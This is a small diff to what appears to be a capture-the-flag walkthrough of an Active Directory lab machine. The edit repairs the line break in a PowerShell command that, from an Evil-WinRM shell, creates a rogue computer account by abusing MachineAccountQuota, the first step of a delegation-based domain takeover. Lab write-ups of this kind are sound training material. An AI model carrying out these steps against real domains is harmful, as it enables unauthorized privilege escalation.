@@ -318,8 +318,7 @@ Mode                 LastWriteTime         Length Name
 Then, we create a new computer object named "test" (note that any Admin User without any other special privilege can create up until 10 Computer objects (MachineAccountQuota) and set them a SPN).
 
 ```powershell
-*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString '123456
-' -AsPlainText -Force) -Verbose
+*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 Verbose: [+] Domain Controller = dc.support.htb
 Verbose: [+] Domain = support.htb
 Verbose: [+] SAMAccountName = test$
